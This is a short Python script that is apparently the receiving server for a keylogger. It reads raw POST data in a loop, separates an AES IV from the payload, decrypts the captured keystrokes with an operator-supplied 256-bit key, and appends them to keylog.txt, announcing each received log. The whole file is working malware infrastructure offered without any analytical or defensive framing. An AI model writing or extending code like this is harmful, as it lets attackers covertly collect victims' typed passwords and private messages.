import os.path
from decryption import *
from collection import *

def main():
    
    hex_key = input("Please enter your 256-bit AES key: ")
        
    while(True):

        clean_request_data = ""
        for char in get_raw_post_data():
            if(ord(char) != 0):
                clean_request_data += char

        seperated_request_data = clean_request_data.split('data=')

        encrypted_data = seperated_request_data[1]

        hex_iv = encrypted_data[len(encrypted_data)-32:len(encrypted_data)]
        encrypted_log = encrypted_data[0:len(encrypted_data)-32]

        decrypted_log = str(decrypt_data(encrypted_log, hex_key, hex_iv))
        
        decrypted_log = decrypted_log.replace("b'","")
        decrypted_log = decrypted_log.replace("'","")

        keylog_file = open('keylog.txt', 'a')
             
        keylog_file.write(decrypted_log)
        
        keylog_file.write('\n')
        keylog_file.write('\n')

        print("[+] Keylog recieved, data written to keylog.txt!")

if __name__ == "__main__":
    main()